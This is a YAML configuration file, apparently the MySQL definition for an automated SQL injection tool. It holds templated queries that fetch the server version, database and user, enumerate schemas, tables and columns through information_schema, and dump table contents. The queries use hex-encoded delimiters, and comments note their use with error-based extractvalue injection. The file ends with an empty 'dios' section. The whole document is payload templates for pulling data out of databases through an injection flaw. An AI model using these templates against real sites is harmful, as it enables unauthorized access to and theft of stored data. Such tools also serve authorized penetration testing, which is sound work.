vendor: MySQL

resource:
 info: |
  concat_ws(
      ${enclose_value_hex},
      version(),
      database(),
      user()
  )

 schema:
  database: |
   select group_concat(
       ${enclose_value_hex},
       r,
       ${separator_qte_hex},
       q,
       ${enclose_value_hex}
       order by r
       separator ${separator_cell_hex}
   ) from (
       select
           schema_name r,
           count(table_name) q
       from information_schema.tables
       right join information_schema.schemata
       on schema_name = table_schema
       group by r
       /* Required by Error Extractvalue */
       order by 1
       ${limit}
   ) x

  table: |
   select group_concat(
       ${enclose_value_hex},
       r,
       ${separator_qte_hex},
       q,
       ${enclose_value_hex}
       order by r
       separator ${separator_cell_hex}
   ) from (
       select
           table_name r,
           ifnull(table_rows, 0x30) q
       from information_schema.tables
       where table_schema = 0x${database.hex}
       /* Required by Error Extractvalue */
       order by 1
       ${limit}
   ) x

  column: |
   select group_concat(
       ${enclose_value_hex},
       n,
       ${separator_qte_hex},
       0,
       ${enclose_value_hex}
       order by n
       separator ${separator_cell_hex}
   ) from (
       select column_name n
       from information_schema.columns
       where table_schema = 0x${database.hex}
       and table_name = 0x${table.hex}
       /* Required by Error Extractvalue */
       order by 1
       ${limit}
   ) x

  row:
   query: |
    select group_concat(
        ${enclose_value_hex},
        r,
        ${separator_qte_hex},
        q,
        ${enclose_value_hex}
        order by r
        separator ${separator_cell_hex}
    ) from (
        select
            concat(${fields}) r,
            count(*) q
        from `${database}`.`${table}`
        group by r
        /* Required by Error Extractvalue */
        order by 1
        ${limit}
    ) x
   fields:
    field: trim(ifnull(`${field.value}`, 0x20))
    concat: ",0x7f,"

 zip:
  database: |
   select group_concat(
       ${enclose_value_hex},
       schema_name,
       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
   )
   from information_schema.schemata
   ${limit}

  table: |
   select group_concat(
       ${enclose_value_hex},
       table_name,
       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
   )
   from information_schema.tables
   where table_schema = '${database}'
   ${limit}

  column: |
   select group_concat(
       ${enclose_value_hex},
       column_name,
       '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
   )
   from information_schema.columns
   where table_schema = '${database}'
   and table_name = '${table}'
   ${limit}

  row:
   query: |
    select group_concat(
        ${enclose_value_hex},
        concat(${fields}),
        '${separator_qte_sql}0${enclose_value_sql}${separator_cell_sql}'
    )
    from ${database}.${table}
    ${limit}
   fields:
    field: "${field.value}"
    concat: ",0x7f,"

 dios:
